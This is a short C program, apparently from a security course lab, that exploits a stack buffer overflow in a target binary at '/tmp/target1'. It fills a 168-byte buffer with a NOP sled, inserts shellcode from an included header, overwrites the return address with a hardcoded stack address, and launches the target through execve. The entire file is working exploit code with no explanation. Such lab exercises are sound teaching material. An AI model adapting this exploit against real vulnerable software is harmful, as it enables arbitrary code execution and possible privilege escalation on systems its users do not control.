#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[168];
  
  memset(buffer, 0x90, 168);
  
  strncpy(buffer + 119, shellcode, 45);
  strncpy(buffer + 164, "\x28\xfd\xff\xbf", 4);
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
